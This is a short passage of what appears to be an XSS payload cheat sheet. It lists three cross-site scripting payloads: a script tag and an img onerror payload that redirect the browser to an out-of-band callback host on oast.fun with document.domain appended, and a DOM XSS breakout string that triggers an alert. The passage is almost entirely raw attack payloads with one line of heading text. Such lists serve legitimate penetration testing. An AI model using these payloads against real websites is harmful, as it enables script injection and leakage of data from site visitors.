___


```html
<script>location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;</script>
```

### DOM Based XSS

Based on a DOM XSS sink.

```
#"><img src=/ onerror=alert(2)>
```


```
<img src="x" onerror="location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;">
```

